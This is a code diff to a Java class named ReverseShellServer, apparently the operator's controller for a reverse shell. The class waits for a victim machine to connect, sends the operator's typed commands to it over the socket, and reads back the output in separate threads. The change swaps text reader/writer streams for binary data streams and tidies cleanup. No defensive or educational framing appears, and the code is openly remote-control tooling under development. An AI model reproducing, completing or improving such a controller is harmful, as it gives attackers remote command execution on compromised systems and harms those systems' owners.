@@ -10,10 +10,9 @@ public class ReverseShellServer {
     private static final Logger logger = Logger.getLogger(ReverseShellServer.class.getName());
     private ServerSocket serverSocket;
     private Socket clientSocket;
-    private BufferedReader in;
-    private PrintWriter out;
-    private BufferedReader userInput;
     private DataInputStream dataIn;
+    private DataOutputStream dataOut;
+    private BufferedReader userInput;
     private Thread outputReceiver;
     private Thread inputHandler;
 
@@ -28,10 +27,10 @@ public class ReverseShellServer {
             waitForConnection();
             setupStreams();
 
-            outputReceiver = new Thread(new ResponseHandler(in, out, clientSocket));
+            outputReceiver = new Thread(new ResponseHandler(dataIn, dataOut, clientSocket));
             outputReceiver.start();
 
-            inputHandler = new Thread(new CommandSender(out, userInput, this));
+            inputHandler = new Thread(new CommandSender(dataOut, userInput, this));
             inputHandler.start();
 
         } catch (IOException e) {
@@ -51,10 +50,9 @@ public class ReverseShellServer {
     }
 
     private void setupStreams() throws IOException {
-        in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
-        out = new PrintWriter(clientSocket.getOutputStream(), true);
-        userInput = new BufferedReader(new InputStreamReader(System.in));
         dataIn = new DataInputStream(clientSocket.getInputStream());
+        dataOut = new DataOutputStream(clientSocket.getOutputStream());
+        userInput = new BufferedReader(new InputStreamReader(System.in));
     }
 
     public Socket getClientSocket() {
@@ -66,11 +64,9 @@ public class ReverseShellServer {
             if (outputReceiver != null && outputReceiver.isAlive()) {
                 outputReceiver.interrupt();
             }
-
             if (inputHandler != null && inputHandler.isAlive()) {
                 inputHandler.interrupt();
             }
-
             closeResources();
         } catch (IOException e) {
             logger.log(Level.SEVERE, "[ERROR] Error during cleanup: " + e.getMessage(), e);
@@ -79,17 +75,14 @@ public class ReverseShellServer {
 
     private void closeResources() throws IOException {
         try {
-            if (in != null) {
-                in.close();
-            }
-            if (out != null) {
-                out.close();
-            }
             if (userInput != null) {
                 userInput.close();
             }
             if (dataIn != null) {
                 dataIn.close();
+            }
+            if (dataOut != null) {
+                dataOut.close();
             }
             if (clientSocket != null) {
                 clientSocket.close();
